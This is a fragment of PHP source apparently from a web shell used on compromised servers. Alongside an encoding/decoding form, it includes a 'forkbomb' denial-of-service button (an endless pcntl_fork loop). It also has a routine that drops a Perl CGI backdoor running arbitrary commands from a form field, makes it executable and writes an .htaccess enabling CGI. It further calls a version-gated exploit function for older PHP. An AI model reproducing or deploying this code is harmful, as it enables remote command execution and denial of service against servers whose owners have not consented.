   <option value=\"b64dec\">Base 64 Decode</option> 
   <option value=\"crypt\">DES Crypt</option> 
   <option value=\"entityenc\">HTML Entities Encode</option> 
   <option value=\"entitydec\">HTML Entities Decode</option> 
   <option value=\"md5\">MD5 Crypt</option> 
   </select><br>
   <input type=\"submit\" name=\"crypt\" value=\"go\" /> 
   </form>";
   echo $cryptform;
   if(isset($_POST['crypt'])) {
    function entityenc($str) {
     $text_array=explode("\r\n", chunk_split($str, 1));
     for ($n=0; $n < count($text_array) - 1; $n++) {
      $newstring .= "&#" . ord($text_array[$n]) . ";";
     }
     return $newstring;
    }
    function entitydec($str) {
     $str=str_replace(';', '; ', $str);
     $text_array=explode(' ', $str);
     for ($n=0; $n < count($text_array) - 1; $n++) {
      $newstring .= chr(substr($text_array[$n], 2, 3));
     }
     return $newstring;
    }
    function asc2hex($str) {
     return chunk_split(bin2hex($str), 2, " ");
    }
    function hex2asc($str) {
     $str=str_replace(" ", "", $str);
     for ($n=0; $n<strlen($str); $n+=2) {
      $newstring .=  pack("C", hexdec(substr($str, $n, 2)));
     }
     return $newstring;
    } 
    $text=$_POST['text'];
    if($text == '') {
     die("<p>empty form</p>\n");
    }
    echo("--><br><textarea cols=\"80\" rows=\"4\" style=\"background: black; color: gray;\">");
    switch ($_POST['cryptmethod']) {
    case "asc2hex":
     $text=asc2hex($text);
     break;
    case "hex2asc":
     $text=hex2asc($text);
     break;
    case 'b64enc':
     $text=base64_encode($text);
     break;
    case 'b64dec':
     $text=base64_decode($text);
     break;
    case 'crypt':
     $text=crypt($text, 'CRYPT_STD_DES');
     break;
    case 'entityenc':
     $text=entityenc($text);
     break;
    case 'entitydec':
     $text=entitydec($text);
     break;
    case 'md5':
     $text=md5($text);
     break;
    }
    $text=htmlentities($text);
    echo("$text</textarea><br>");
   }
   //decoders end
   echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
  }
  if (!empty($_POST["extraz"])) {
   switch ($_POST["extraz"]) {
    case "fork":
     while(pcntl_fork()|1); 
     break;
    case "info":
     header('Location: '.$_SERVER['PHP_SELF'].'?p=pi');
     break;
    case "perlsh":
     //author/license unknown, assuming WTFPL 
     if ($failflag=="1") {
      $perlbin="/usr/bin/perl";
     } else {
      $perlbin=search("perl",$failflag);
     }
     $perlshcode='#!'.$perlbin.'
      use CGI qw/-no_xhtml :standard/;
      use CGI::Carp qw(fatalsToBrowser);
      print header(-charset => "utf-8"),
      start_html(-lang => "ru", -title => "");
      if ( param() ) {
      my $v = param("v");
      print $v, "<br>\n";
      my $timeout = 30;
      local $SIG{ALRM} = sub { close KAN;
      print " ";
      die "timeout"; };
      $pid = open(KAN, "$v 2>&1 |");
      die "can`t $!.\n" unless ($pid);
      eval {
      alarm($timeout);
      print "<br><textarea cols=\"80\" rows=\"25\">";
      while( <KAN> ) { print; }
      print "</textarea><br>";
      alarm(0);
      close KAN;
      }
      }
      print start_form,
      textfield(-name=>"v", -size=> 30, -value=> ""), submit("Go"),
      endform, end_html;
      exit(0);';
     $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
AddType application/x-httpd-cgi .pl';
     if (strnatcmp(version(),"5.2.9") <= 0) { 
      sploent516();
     }
     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; } 
     else {
      fwrite($fh,$perlshcode);
      fclose($fh);
      echo $_POST["file"]." write done, chmoding..<br>";
      $ch=chmod($_POST["dir"]."/".$_POST["file"], 0755);
			if (!$ch) {
       echo "chmod failed, make chmod 755 manually<br>";
      } else {
       echo "chmod done<br>";
      }
      if ($_POST["htaccess"] == "on") {
       $fh=fopen($_POST["dir"]."/.htaccess","w");
       fwrite($fh,$htaccess);
       fclose($fh);
       echo "htaccess done";
      }
     }
     break;
   }
  }
  break;
// extras end ###
 case "pi":
  phpinfo();
  break;
} 
// :)
?>
